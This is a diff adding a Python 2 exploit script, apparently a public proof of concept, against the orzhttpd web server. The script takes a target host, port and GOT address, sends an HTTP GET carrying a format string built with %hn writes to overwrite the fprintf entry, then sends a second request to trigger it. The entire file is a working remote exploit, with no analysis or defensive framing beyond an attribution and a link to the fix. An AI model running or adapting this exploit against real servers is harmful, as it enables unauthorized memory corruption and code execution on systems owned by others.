@@ -1,0 +1,61 @@
+#!/usr/bin/env python
+# orzex.py -- Patroklos Argyroudis, argp at domain census-labs.com
+# http://code.google.com/p/orzhttpd/source/detail?r=141
+
+import os
+import sys
+import socket
+import struct
+import time
+import urllib
+
+GET = "GET "
+
+def main(argv):
+    argc = len(argv)
+
+    if argc != 4:
+        print "usage: %s <host> <port> <address>" % (argv[0])
+        print "[*] find address with objdump -R orzhttpd | grep fprintf"
+        sys.exit(0)
+
+    host = argv[1]
+    port = int(argv[2])
+    addr = int(argv[3], 16)
+
+    print "[*] target: %s:%d:%s" % (host, port, argv[3])
+
+    try:
+        sd = urllib.urlopen("http://%s:%d" % (host, port))
+        sd.close()
+    except IOError, errmsg:
+        print "[*] error: %s" % (errmsg)
+        sys.exit(1)
+    
+    time.sleep(1)
+
+    fmtstr = struct.pack('<LL', addr + 2, addr)
+    fmtstr += "%.16650x%19$hn%.514x%20$hn"
+
+    payload = GET
+    payload += fmtstr
+
+    print "[*] sending exploit format string to %s:%d" % (host, port)
+
+    sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sd.connect((host, port))
+    sd.send(payload)
+    sd.close()
+
+    print "[*] sending trigger to %s:%d" % (host, port)
+
+    sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sd.connect((host, port))
+    sd.send(GET)
+    sd.close()
+    
+if __name__ == "__main__":
+    main(sys.argv)
+    sys.exit(0)
+
+# EOF
